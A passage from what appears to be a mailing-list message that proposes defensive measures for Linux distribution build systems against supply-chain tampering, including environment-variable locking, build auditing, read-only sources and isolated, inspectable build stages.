    implicitly through environment variables doesn't seem like a great
    idea. Could we sanitize or enforce environment variables through
    something like seccomp or landlock? We could imagine the top-level
    build process declaring "from here on, any exec() cannot remove or
    change CFLAGS" or "from here on, PKG_CONFIG_PATH cannot be set".

3) Distro build systems could output their environment variables at
    various stages of the build so they can be audited for any suspicious
    variables or values.

4) It might be useful to perform builds using overlayfs or landlock so
    that ALL other files on the system that are not used for the build
    are removed or made inaccessible.

5) Use separate source and build directories. All source files and
    directories must be read-only to prevent tampering during the build.

6) It might be useful to have build systems output straight-line shell
    scripts (using no functions or variables) that can be generated and
    executed in separate stages (perhaps isolated from each other using
    overlayfs or containers) and inspected and diffed. In other words,
    separating the build system from the build.

Even if we did all of this, it would of course still not be enough. The
underlying problem is having things that are unreadable or unreviewable --
binary files, inscrutable code (whether shell scripts, makefiles, m4 code,
or, in some cases, Perl code).

Anyway, I hope this was useful, I certainly learnt a lot.


Vegard
